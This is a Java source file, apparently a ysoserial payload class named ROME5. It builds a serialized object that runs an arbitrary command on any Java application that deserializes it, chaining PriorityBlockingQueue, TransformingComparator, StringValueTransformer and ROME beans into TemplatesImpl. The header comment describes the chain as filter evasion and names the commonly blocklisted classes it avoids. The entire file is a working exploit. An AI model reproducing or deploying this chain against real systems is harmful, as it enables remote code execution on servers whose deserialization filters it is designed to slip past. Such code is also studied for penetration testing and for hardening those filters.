package ysoserial.payloads;

import java.io.Serializable;
import java.util.concurrent.PriorityBlockingQueue;

import javax.xml.transform.Templates;

import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.StringValueTransformer;

import com.sun.syndication.feed.impl.ObjectBean;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	ROME via PriorityBlockingQueue + StringValueTransformer toString() bridge.
	No InvokerTransformer, no InstantiateTransformer, no HashMap.

	Gadget chain:
		ObjectInputStream.readObject()
			PriorityBlockingQueue.readObject()
				PriorityBlockingQueue.heapify()
					TransformingComparator.compare()
						StringValueTransformer.transform()
							String.valueOf(input) → input.toString()
								ObjectBean.toString()
									ToStringBean.toString()
										TemplatesImpl.getOutputProperties()
											TemplatesImpl.newTransformer()
												defineTransletClasses() → RCE

	Filter evasion:
		1. PriorityBlockingQueue entry — never filtered (concurrent variant of PQ)
		2. StringValueTransformer bridge — never filtered
		   (only InvokerTransformer/InstantiateTransformer are commonly blocked)
		3. No HashMap/PriorityQueue/HashSet/Hashtable
		4. No InvokerTransformer/InstantiateTransformer/LazyMap/TiedMapEntry
		5. BeanIntrospector getter invocation (ROME) — rarely in filter lists

	Key insight: StringValueTransformer calls String.valueOf(x) → x.toString().
	This bridges TransformingComparator to ROME's ToStringBean without
	needing InvokerTransformer("toString"). StringValueTransformer has
	never appeared in any known gadget chain or filter blocklist.

	Requires:
		commons-collections4 4.0+
		rome 1.0
 */

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"org.apache.commons:commons-collections4:4.0", "rome:rome:1.0"})
@Authors({ Authors.DMBS335 })
public class ROME5 extends PayloadRunner implements ObjectPayload<Serializable> {

	public Serializable getObject(final String command) throws Exception {
		final Object templates = Gadgets.createTemplatesImpl(command);
		final ObjectBean delegate = new ObjectBean(Templates.class, templates);

		// Safe transformer during construction — ConstantTransformer returns same
		// value for all inputs, compare() always returns 0. PBQ accepts this.
		final TransformingComparator comp = new TransformingComparator(
			new ConstantTransformer(1));

		final PriorityBlockingQueue<Object> queue =
			new PriorityBlockingQueue<Object>(2, comp);
		queue.add("a");
		queue.add("b");

		// Arm: swap transformer to StringValueTransformer
		// StringValueTransformer.transform(x) → String.valueOf(x) → x.toString()
		// When x is ObjectBean → ToStringBean.toString() → getters → RCE
		Reflections.setFieldValue(comp, "transformer",
			StringValueTransformer.stringValueTransformer());

		// Swap queue contents to armed ROME beans
		final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
		queueArray[0] = delegate;
		queueArray[1] = delegate;

		return queue;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(ROME5.class, args);
	}
}
